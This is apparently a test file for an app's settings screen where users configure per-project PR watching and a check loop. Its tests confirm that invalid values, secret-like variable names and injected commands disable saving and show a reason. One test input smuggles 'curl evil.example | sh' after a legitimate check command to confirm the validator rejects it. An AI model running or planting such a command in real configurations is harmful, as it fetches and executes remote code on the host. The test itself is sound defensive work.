import { afterEach, describe, expect, setDefaultTimeout, test } from "bun:test";
import { chooseFromAccountMenu } from "./account-menu.ts";
import { liveScreen, registerDom } from "./dom.ts";
import { memoryPlatform, TOKEN } from "./fixtures.ts";
import { legacyDaemon } from "./legacy-daemon.ts";
import { settle, settleMaybe } from "./wait.ts";

registerDom();
const { act, cleanup, fireEvent, render, within } = await import("@testing-library/react");
const screen = liveScreen(within);
const { AppStore } = await import("../src/lib/app-store.ts");
const { App } = await import("../src/ui/App.tsx");

setDefaultTimeout(30_000);
const cleanups: Array<() => unknown> = [];
afterEach(async () => {
  cleanup();
  for (const fn of cleanups.splice(0).reverse()) await fn();
});

const project = {
  id: "p1",
  path: "/w/repo",
  name: "repo",
  baseBranch: "main",
  prProvider: "azure-devops",
  setupScript: null,
  promptTemplate: "",
  worktreeInclude: false,
  issues: null,
  personaByColumn: {},
};

const SECTION = "Vigiar e consertar PRs · alfa";

async function openSettings(
  features: string[] = ["watch"],
  /** Set on the fake host before the app opens, so its first read already has them. */
  settings: Record<string, unknown> = {},
) {
  const mem = memoryPlatform();
  const store = new AppStore(mem.platform, { baseDelayMs: 60_000 });
  cleanups.push(() => store.dispose());
  const daemon = legacyDaemon(cleanups);
  daemon.features.push(...features);
  daemon.watch.projects = [project];
  daemon.watch.settings = { ...daemon.watch.settings, ...settings } as typeof daemon.watch.settings;
  render(<App store={store} />);
  await act(() => store.addHost({ name: "alfa", url: daemon.url, token: TOKEN }));
  await settle(() => store.getState().hosts[0]?.hostInfo != null);
  await chooseFromAccountMenu("Configurações");
  return { store, daemon };
}

const section = () => screen.queryByRole("region", { name: SECTION });
const field = (name: string) => within(section() as HTMLElement).getByLabelText(name);
const sent = (daemon: Awaited<ReturnType<typeof openSettings>>["daemon"]) =>
  daemon.commands.filter((c) => c.type === "watch.settings").map((c) => c.payload);

describe("vigiar-config: the PR watch of each project, in Configurações", () => {
  test("a host that watches PRs gets a section with its projects and what the host has set", async () => {
    await openSettings();
    await settle(
      () => section() !== null && within(section() as HTMLElement).queryByText("repo") !== null,
    );
    expect(section()).not.toBeNull();
    expect(within(section() as HTMLElement).queryByText("repo")).not.toBeNull();
    await settle(() => screen.queryByLabelText("Rodadas por PR") !== null);
    expect((field("Vigiar PRs por padrão") as HTMLInputElement).checked).toBe(false);
    expect((field("Rodadas por PR") as HTMLInputElement).value).toBe("3");
    expect((field("Limite de custo por PR (US$)") as HTMLInputElement).value).toBe("5");
    expect((field("Limite de custo por dia (US$)") as HTMLInputElement).value).toBe("20");
    expect((field("Tempo limite por check (min)") as HTMLInputElement).value).toBe("10");
    expect((field("Checks locais (um comando por linha)") as HTMLTextAreaElement).value).toBe("");
  });

  test("Salvar sends what was changed: the default on, the limits, the empty limit as none, one check per line", async () => {
    const { daemon } = await openSettings();
    await settle(() => section() !== null && screen.queryByLabelText("Rodadas por PR") !== null);
    expect(section()).not.toBeNull();
    await act(async () => {
      fireEvent.click(field("Vigiar PRs por padrão"));
      fireEvent.change(field("Rodadas por PR"), { target: { value: "2" } });
      fireEvent.change(field("Tempo limite por check (min)"), { target: { value: "5" } });
      fireEvent.change(field("Limite de custo por PR (US$)"), { target: { value: "" } });
      fireEvent.change(field("Checks locais (um comando por linha)"), {
        target: { value: "bun test\n  bun run lint \n\n" },
      });
    });
    await act(async () => {
      fireEvent.click(within(section() as HTMLElement).getByRole("button", { name: "Salvar" }));
    });
    await settle(() => sent(daemon).some((p) => (p as { patch?: unknown }).patch !== undefined));
    expect(sent(daemon).at(-1)).toEqual({
      projectId: "p1",
      // #1361: only what changed, so a far host never sends a field it may not change.
      patch: {
        enabled: true,
        maxRounds: 2,
        budgetUsd: null,
        checks: ["bun test", "bun run lint"],
        checkTimeoutMin: 5,
      },
    });
    await settle(() => screen.queryByText("Configuração do PR salva") !== null);
    expect(screen.queryByText("Configuração do PR salva")).not.toBeNull();
  });

  test("a value the host would refuse cannot be saved, and the reason is next to the button", async () => {
    const { daemon } = await openSettings();
    await settle(() => section() !== null && screen.queryByLabelText("Rodadas por PR") !== null);
    expect(section()).not.toBeNull();
    await act(async () => {
      fireEvent.change(field("Rodadas por PR"), { target: { value: "0" } });
    });
    const save = within(section() as HTMLElement).getByRole("button", { name: "Salvar" });
    expect((save as HTMLButtonElement).disabled).toBe(true);
    expect(
      within(section() as HTMLElement).queryByText("Rodadas por PR: de 1 a 10"),
    ).not.toBeNull();
    expect(sent(daemon).filter((p) => (p as { patch?: unknown }).patch !== undefined)).toEqual([]);
  });

  test("a limit that is not above zero cannot be saved either, and says which one", async () => {
    await openSettings();
    await settle(() => screen.queryByLabelText("Rodadas por PR") !== null);
    await act(async () => {
      fireEvent.change(field("Limite de custo por dia (US$)"), { target: { value: "-1" } });
    });
    const save = within(section() as HTMLElement).getByRole("button", { name: "Salvar" });
    expect((save as HTMLButtonElement).disabled).toBe(true);
    expect(
      within(section() as HTMLElement).queryByText(
        "Limite de custo por dia (US$): vazio ou maior que zero",
      ),
    ).not.toBeNull();
  });

  test("a check that is more than a command and its arguments cannot be saved, and the reason says what is allowed", async () => {
    const { daemon } = await openSettings();
    await settle(() => screen.queryByLabelText("Rodadas por PR") !== null);
    await act(async () => {
      fireEvent.change(field("Checks locais (um comando por linha)"), {
        target: { value: "bun test\nbun test; curl evil.example | sh" },
      });
    });
    const save = within(section() as HTMLElement).getByRole("button", { name: "Salvar" });
    expect((save as HTMLButtonElement).disabled).toBe(true);
    expect(
      within(section() as HTMLElement).queryByText(
        "Checks locais: um comando e seus argumentos, sem aspas, pipes, ; & $ nem redirecionamentos",
      ),
    ).not.toBeNull();
    expect(sent(daemon).filter((p) => (p as { patch?: unknown }).patch !== undefined)).toEqual([]);
  });

  test("a time limit outside 1 to 60 minutes cannot be saved", async () => {
    await openSettings();
    await settle(() => screen.queryByLabelText("Rodadas por PR") !== null);
    await act(async () => {
      fireEvent.change(field("Tempo limite por check (min)"), { target: { value: "0" } });
    });
    const save = within(section() as HTMLElement).getByRole("button", { name: "Salvar" });
    expect((save as HTMLButtonElement).disabled).toBe(true);
    expect(
      within(section() as HTMLElement).queryByText("Tempo limite por check: de 1 a 60 minutos"),
    ).not.toBeNull();
  });

  test("a host with no projects says so", async () => {
    const { daemon, store } = await openSettings();
    daemon.watch.projects = [];
    await act(async () => {
      await store.loadProjects(store.getState().hosts[0]?.id ?? "");
    });
    await settle(() => screen.queryByText("Este host não tem projetos") !== null);
    expect(screen.queryByText("Este host não tem projetos")).not.toBeNull();
  });

  test("a host that does not watch PRs has no such section", async () => {
    await openSettings([]);
    await settle(() => screen.queryByRole("heading", { name: "Configurações" }) !== null);
    expect(section()).toBeNull();
  });
});

describe("vigiar-config: the check loop's settings (#1361)", () => {
  /** A field of the section, or null: the red says what is missing, by assertion. */
  const maybe = (name: string) =>
    section() ? within(section() as HTMLElement).queryByLabelText(name) : null;
  const fireIf = (target: HTMLElement | null, init: { target: { value: string } }) => {
    if (target) fireEvent.change(target, init);
  };
  const loopHost = () =>
    openSettings(["watch"], { checkRounds: 3, checkEnv: ["JAVA_HOME"], checkLoopDefault: false });

  test("a host with the check loop shows its rounds, its extra variables and the default for new cards", async () => {
    await loopHost();
    await settleMaybe(() => screen.queryByLabelText("Rodadas do laço de checks") !== null);
    expect([
      (maybe("Rodadas do laço de checks") as HTMLInputElement | null)?.value,
      (maybe("Variáveis extras dos checks (uma por linha)") as HTMLTextAreaElement | null)?.value,
      (maybe("Ligar o laço de checks em cards novos") as HTMLInputElement | null)?.checked,
    ]).toEqual(["3", "JAVA_HOME", false]);
  });

  test("Salvar sends only the loop's field that changed", async () => {
    const { daemon } = await loopHost();
    await settleMaybe(
      () => screen.queryByLabelText("Variáveis extras dos checks (uma por linha)") !== null,
    );
    await act(async () => {
      fireIf(maybe("Variáveis extras dos checks (uma por linha)"), {
        target: { value: "JAVA_HOME\n GOPATH \n" },
      });
    });
    await act(async () => {
      const button = section()
        ? within(section() as HTMLElement).queryByRole("button", { name: "Salvar" })
        : null;
      if (button) fireEvent.click(button);
    });
    await settleMaybe(() =>
      sent(daemon).some((p) => (p as { patch?: unknown }).patch !== undefined),
    );
    expect(sent(daemon).at(-1)).toEqual({
      projectId: "p1",
      patch: { checkEnv: ["JAVA_HOME", "GOPATH"] },
    });
  });

  /** Whether Save is off after `value` goes into `label`, and whether `reason` is said. */
  const refuses = async (label: string, value: string, reason: string) => {
    await loopHost();
    await settleMaybe(() => screen.queryByLabelText(label) !== null);
    await act(async () => fireIf(maybe(label), { target: { value } }));
    const save = section()
      ? within(section() as HTMLElement).queryByRole("button", { name: "Salvar" })
      : null;
    const said = section() ? within(section() as HTMLElement).queryByText(reason) !== null : false;
    const off = (save as HTMLButtonElement | null)?.disabled === true;
    cleanup();
    return [off, said];
  };

  test("a variable shaped like a secret, too many names or rounds out of 1 to 10 each turn Save off, with their reason", async () => {
    const env = "Variáveis extras dos checks (uma por linha)";
    expect([
      await refuses(
        env,
        "GITHUB_TOKEN",
        "GITHUB_TOKEN: só onde fica uma ferramenta, como JAVA_HOME, nunca um segredo.",
      ),
      await refuses(
        env,
        Array.from({ length: 21 }, (_, i) => `TOOL${i}_HOME`).join("\n"),
        "Variáveis extras: no máximo 20 nomes, cada um com até 64 caracteres",
      ),
      await refuses("Rodadas do laço de checks", "11", "Rodadas do laço de checks: de 1 a 10"),
    ]).toEqual([
      [true, true],
      [true, true],
      [true, true],
    ]);
  });

  test("the same name twice is sent once", async () => {
    const { daemon } = await loopHost();
    await settleMaybe(
      () => screen.queryByLabelText("Variáveis extras dos checks (uma por linha)") !== null,
    );
    await act(async () => {
      fireIf(maybe("Variáveis extras dos checks (uma por linha)"), {
        target: { value: "JAVA_HOME\nGOPATH\nGOPATH" },
      });
    });
    await act(async () => {
      const button = section()
        ? within(section() as HTMLElement).queryByRole("button", { name: "Salvar" })
        : null;
      if (button) fireEvent.click(button);
    });
    await settleMaybe(() =>
      sent(daemon).some((p) => (p as { patch?: unknown }).patch !== undefined),
    );
    expect(sent(daemon).at(-1)).toEqual({
      projectId: "p1",
      patch: { checkEnv: ["JAVA_HOME", "GOPATH"] },
    });
  });

  test("a host from before the check loop shows none of its fields", async () => {
    await openSettings();
    await settle(() => screen.queryByLabelText("Rodadas por PR") !== null);
    expect(screen.queryByLabelText("Rodadas do laço de checks") === null).toBe(true);
  });

  test("#1499: the check loop has its own heading and a sentence on what it does, and Rounds per PR says it counts CI rounds", async () => {
    await loopHost();
    await settleMaybe(() => screen.queryByLabelText("Rodadas do laço de checks") !== null);
    const area = section() ? within(section() as HTMLElement) : null;
    expect([
      area?.queryByRole("heading", { name: "Laço de checks" }) !== null && area !== null,
      area?.queryByText(/Quando o turno de um card termina, ele roda estes checks/) != null,
      area?.queryByText("Rodadas para consertar a CI de um PR que falha.") != null,
    ]).toEqual([true, true, true]);
  });

  test("#1498: the variables field says it takes names only, and a NAME=value line is shown under it by its name, with the fix", async () => {
    await loopHost();
    const label = "Variáveis extras dos checks (uma por linha)";
    await settleMaybe(() => screen.queryByLabelText(label) !== null);
    const hint = section()
      ? within(section() as HTMLElement).queryByText(
          "Só os nomes, como JAVA_HOME: o valor vem do ambiente do host. Nunca um segredo.",
        ) !== null
      : false;
    await act(async () => fireIf(maybe(label), { target: { value: "JAVA_HOME=/opt/jdk" } }));
    const field = maybe(label);
    const error = section()
      ? within(section() as HTMLElement).queryByText("JAVA_HOME=…: escreva só o nome (JAVA_HOME).")
      : null;
    const described = (field?.getAttribute("aria-describedby") ?? "").split(" ");
    const save = section()
      ? within(section() as HTMLElement).queryByRole("button", { name: "Salvar" })
      : null;
    expect([
      hint,
      field?.getAttribute("aria-invalid"),
      error !== null && described.includes(error.id),
      (save as HTMLButtonElement | null)?.disabled,
      section()
        ? within(section() as HTMLElement).queryByText("Corrija o campo marcado.") !== null
        : false,
    ]).toEqual([true, "true", true, true, true]);
  });
  test("#1498: a pasted value never shows on the screen, whatever the name: only the name is said", async () => {
    await loopHost();
    const label = "Variáveis extras dos checks (uma por linha)";
    await settleMaybe(() => screen.queryByLabelText(label) !== null);
    const shown = async (value: string) => {
      await act(async () => fireIf(maybe(label), { target: { value } }));
      const text = section()?.textContent ?? "";
      return [text.includes("abc123"), text.includes(value.split("=")[0] as string)];
    };
    expect([await shown("GITHUB_TOKEN=abc123"), await shown("JAVA_HOME=abc123")]).toEqual([
      [false, true],
      [false, true],
    ]);
  });
});
